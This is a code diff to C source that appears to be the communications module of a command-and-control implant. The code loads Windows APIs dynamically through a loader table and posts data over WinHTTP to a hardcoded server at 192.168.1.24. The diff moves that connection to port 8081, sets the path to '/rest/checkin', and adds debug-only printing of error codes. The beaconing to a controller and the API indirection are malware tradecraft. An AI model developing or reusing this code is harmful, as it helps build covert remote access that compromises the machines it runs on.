@@ -1,6 +1,23 @@
 #include "../../includes/core/core.h"
 #include "../../includes/comms/comms.h"
 
+#ifdef DEBUG
+static void DbgErr(void) {
+	DWORD e = GetLastError();
+	static const char hexd[] = "0123456789abcdef";
+	char out[16];
+	out[0]='G'; out[1]='L'; out[2]='E'; out[3]=':';
+	out[4]='0'; out[5]='x';
+	for (int i = 0; i < 8; i++) out[6+i] = hexd[(e >> (28 - 4*i)) & 0xF];
+	out[14] = '\n';
+	DWORD w;
+	WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), out, 15, &w, NULL);
+}
+#define DBGERR() DbgErr()
+#else
+#define DBGERR()
+#endif
+
 
 BOOL NwLoadApis() {
 	CHAR dll[12];
@@ -47,17 +64,19 @@ PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, B
         NULL, NULL, 0);
     if (!hSession) goto CLEANUP;
 
-    hConnect = ldr->win32->WinHttpConnect(hSession, L"192.168.1.24", 80, 0);
+    hConnect = ldr->win32->WinHttpConnect(hSession, L"192.168.1.24", 8081, 0);
     if (!hConnect) {
+        DBGERR();
         DBGA("[!] WinHttpConnect Failed\n");
         goto CLEANUP;
     }
 
-    hRequest = ldr->win32->WinHttpOpenRequest(hConnect, L"POST", L"/endpoint", NULL,
+    hRequest = ldr->win32->WinHttpOpenRequest(hConnect, L"POST", L"/rest/checkin", NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         0);
     if (!hRequest) {
+        DBGERR();
         DBGA("[!] WinHttpOpenRequest Failed\n");
         goto CLEANUP;
     }
@@ -67,6 +86,7 @@ PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, B
         PostBody, PostBodySize,
         PostBodySize, 0);
     if (!bResults) {
+        DBGERR();
         DBGA("[!] WinHttpSendRequest Failed\n");
         goto CLEANUP;
     }
@@ -74,6 +94,7 @@ PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, B
     if (bReadResponse) {
         bResults = ldr->win32->WinHttpReceiveResponse(hRequest, NULL);
         if (!bResults) {
+            DBGERR();
             DBGA("[!] WinHttpReceiveResponse Failed\n");
             goto CLEANUP;
         }
